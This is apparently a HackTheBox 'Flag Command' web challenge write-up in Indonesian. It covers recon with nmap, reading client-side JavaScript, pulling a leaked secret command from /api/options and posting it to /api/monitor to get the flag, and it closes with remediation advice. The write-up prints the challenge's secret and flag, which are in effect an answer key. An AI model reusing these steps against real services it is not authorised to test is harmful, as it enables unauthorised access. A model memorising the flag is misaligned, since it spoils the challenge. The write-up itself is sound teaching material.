# HTB Flag Command — Full Walkthrough (Web)

> **Challenge:** Flag Command · **Kategori:** Web · **OS Server:** Linux (Python/Flask)
> **Target:** `154.57.164.78:32119`
> **Attack path:** Recon → analisis JS client-side → endpoint `/api/options` bocorkan perintah rahasia → POST ke `/api/monitor` → flag

---

## 🏁 Flag

```
HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```

---

## 🧰 Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `nmap` | Recon port & service |
| `curl` | Ambil halaman, JS, dan endpoint API |
| `python3` (`json.tool`) | Merapikan output JSON |

---

## 🔎 Step 1 — Reconnaissance

### 1.1 Nmap (service detection)

```bash
nmap -Pn -sCV -p32119 154.57.164.78
```

Output:
```
PORT      STATE SERVICE VERSION
32119/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.8)
|_http-title: Flag Command
|_http-server-header: Werkzeug/3.0.1 Python/3.11.8
```

> 🧠 **Analisis:** Server = **Werkzeug 3.0.1 / Python 3.11.8** → aplikasi **Flask** (Werkzeug adalah WSGI dev server-nya). Judul halaman **"Flag Command"** menandakan ini challenge berbasis "perintah". Ini bukan binary/service custom, jadi vektor utamanya **web**.

### 1.2 Ambil halaman utama

```bash
curl -s -i --max-time 15 http://154.57.164.78:32119/
```

Output (potongan penting):
```html
<title>Flag Command</title>
<link rel="stylesheet" href="/static/terminal/css/terminal.css" />
...
<div id="terminal-container"> ... </div>
<div id="command">
  <textarea id="user-text-input" autofocus></textarea>
  ...
</div>
<script src="/static/terminal/js/commands.js" type="module"></script>
<script src="/static/terminal/js/main.js" type="module"></script>
<script src="/static/terminal/js/game.js" type="module"></script>
```

> 🧠 **Analisis:** Ini **terminal game** di browser. Logika permainan ada di **file JavaScript** (`commands.js`, `main.js`, `game.js`) yang bisa kita baca langsung. Di sinilah biasanya kebocoran logika/challenge tersembunyi.

---

## 📜 Step 2 — Analisis Sumber JavaScript

Ambil ketiga file JS:

```bash
for f in commands.js main.js game.js; do
  echo "===== $f ====="
  curl -s --max-time 15 "http://154.57.164.78:32119/static/terminal/js/$f"
done
```

### 2.1 `commands.js` — teks & opsi
Berisi teks permainan (`START`, `INFO`, `HELP`, `GAME_WON`, `GAME_LOST`) dan opsi awal (`HEAD NORTH/SOUTH/EAST/WEST`).

> 🧠 **Analisis:** Ada petunjuk cerita menyebut kata **`Xclow3n`** dan opsi cabang seperti `FOLLOW A MYSTERIOUS PATH`, `SET UP CAMP`, dst. Ini mengarah ke struktur *step* permainan.

### 2.2 `main.js` — LOGIKA KUNCI (bocoran)

Potongan paling penting:

```javascript
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    // >>> Perintah VALID jika ada di step saat ini ATAU di daftar 'secret'
    if (availableOptions[currentStep].includes(currentCommand) ||
        availableOptions['secret'].includes(currentCommand)) {

        await fetch('/api/monitor', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 'command': currentCommand })
        })
        .then((res) => res.json())
        .then(async (data) => {
            await displayLineInTerminal({ text: data.message });

            if (data.message.includes('Game over')) { playerLost(); return; }

            // >>> Jika respons berisi 'HTB{' -> MENANG
            if (data.message.includes('HTB{')) { playerWon(); return; }
            ...
        });
    } else {
        displayLineInTerminal({ text: "You do realise its not a park ..." });
    }
}
```

Dan fungsi yang mengambil daftar opsi:

```javascript
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;   // <- dari server
        });
}
```

> 🧠 **Analisis (INTI CHALLENGE):**
> 1. Perintah dianggap sah jika ada di **`availableOptions['secret']`**.
> 2. `availableOptions` diambil dari endpoint **`/api/options`**.
> 3. Jika perintah yang dikirim ke `/api/monitor` menghasilkan pesan berisi **`HTB{`**, permainan selesai (flag keluar).
>
> **Kesimpulan:** Server membocorkan **perintah rahasia** di `/api/options`. Kita cukup mengambilnya, lalu mengirimnya ke `/api/monitor` — tanpa perlu menyelesaikan labirin.

### 2.3 `game.js` — mekanik menang/kalah
Hanya menampilkan pesan `GAME_WON` / `GAME_LOST` (tidak ada logika tambahan).

---

## 🔓 Step 3 — Ambil Perintah Rahasia

Endpoint `/api/options` mengembalikan **seluruh** perintah, termasuk key `secret`:

```bash
curl -s --max-time 15 http://154.57.164.78:32119/api/options | python3 -m json.tool
```

Output:
```json
{
    "allPossibleCommands": {
        "1": [ "HEAD NORTH", "HEAD WEST", "HEAD EAST", "HEAD SOUTH" ],
        "2": [ "GO DEEPER INTO THE FOREST", "FOLLOW A MYSTERIOUS PATH", "CLIMB A TREE", "TURN BACK" ],
        "3": [ "EXPLORE A CAVE", "CROSS A RICKETY BRIDGE", "FOLLOW A GLOWING BUTTERFLY", "SET UP CAMP" ],
        "4": [ "ENTER A MAGICAL PORTAL", "SWIM ACROSS A MYSTERIOUS LAKE", "FOLLOW A SINGING SQUIRREL", "BUILD A RAFT AND SAIL DOWNSTREAM" ],
        "secret": [
            "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
        ]
    }
}
```

Ambil hanya nilai `secret` (opsional, lebih ringkas):

```bash
curl -s http://154.57.164.78:32119/api/options \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['allPossibleCommands']['secret'])"
```

Output:
```
['Blip-blop, in a pickle with a hiccup! Shmiggity-shmack']
```

> ✅ **Perintah rahasia:** `Blip-blop, in a pickle with a hiccup! Shmiggity-shmack`

---

## 🏁 Step 4 — Kirim Perintah Rahasia → Flag

```bash
curl -s -X POST http://154.57.164.78:32119/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

Output:
```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}"
}
```

> 🏁 **FLAG = `HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}`**

---

## ⛓️ Full Attack Chain (ringkas)

```
1. RECON       nmap → 32119 (Werkzeug/Flask) "Flag Command"
2. ANALISIS    baca /static/terminal/js/main.js → logika: cek availableOptions['secret']
                 + POST ke /api/monitor; pesan berisi 'HTB{' = menang
3. BOCOR       GET /api/options → key "secret" berisi perintah rahasia
                 → "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
4. FLAG        POST /api/monitor {"command": <secret>} → HTB{D3v3l0p3r_t00l5_4r3_b35t__t0015_wh4t_d0_y0u_Th1nk??}
```

## 🌐 Endpoint Penting

| Endpoint | Method | Fungsi | Catatan |
|----------|--------|--------|---------|
| `/` | GET | Halaman terminal game | — |
| `/static/terminal/js/main.js` | GET | Logika permainan (client) | **Bocorkan alur** |
| `/api/options` | GET | Daftar semua perintah | **Bocorkan `secret`** ⚠️ |
| `/api/monitor` | POST | Kirim perintah, balas pesan | Mengembalikan flag bila perintah benar |

---

## 📋 Cheat Sheet Perintah

```bash
# --- Recon ---
nmap -Pn -sCV -p32119 154.57.164.78
curl -s -i http://154.57.164.78:32119/

# --- Baca sumber (logika) ---
curl -s http://154.57.164.78:32119/static/terminal/js/main.js

# --- Ambil perintah rahasia ---
curl -s http://154.57.164.78:32119/api/options | python3 -m json.tool

# --- Kirim perintah rahasia -> flag ---
curl -s -X POST http://154.57.164.78:32119/api/monitor \
  -H 'Content-Type: application/json' \
  -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

---

## 🛡️ Remediation (Perbaikan)

| # | Kerentanan | Perbaikan |
|---|-----------|-----------|
| 1 | `/api/options` mengembalikan **semua** perintah termasuk `secret` | Kirim ke client **hanya opsi step saat ini**; jangan pernah sertakan opsi rahasia |
| 2 | Validasi "secret" hanya di **client-side** (JS) | Validasi perintah **sepenuhnya di server**; client tidak boleh tahu daftar perintah rahasia |
| 3 | Flag dikembalikan atas input yang **bisa diprediksi/dibocorkan** | Jangan taruh flag di respons atas perintah yang dapat ditemukan di data publik; gunakan state sesi yang sah |
| 4 | Logika permainan bocor di JS | Pindahkan state machine ke server; simpan progres di sesi server-side |

**Prinsip kunci:** *Jangan pernah mempercayai client.* Data yang dikirim ke browser (JS/JSON) **bisa dibaca siapa saja** — rahasia harus tinggal di server.

---

## 📝 Catatan & Pelajaran

- **Selalu baca sumber JavaScript** pada challenge web — sering memuat endpoint tersembunyi, kunci API, atau logika validasi.
- **Periksa endpoint API** yang dipanggil client (`/api/...`): sering mengembalikan lebih banyak data daripada yang seharusnya.
- **"Secret" di data publik = tidak rahasia.** Cek selalu apakah ada key menarik (`secret`, `admin`, `debug`, dll.) di respons JSON.
- Teknik ini termasuk **client-side logic bypass / information disclosure** — kelas kerentanan web yang sangat umum.

---

*Dokumentasi dibuat: 2026-10-14 · Challenge: HTB Flag Command · Target: 154.57.164.78:32119*
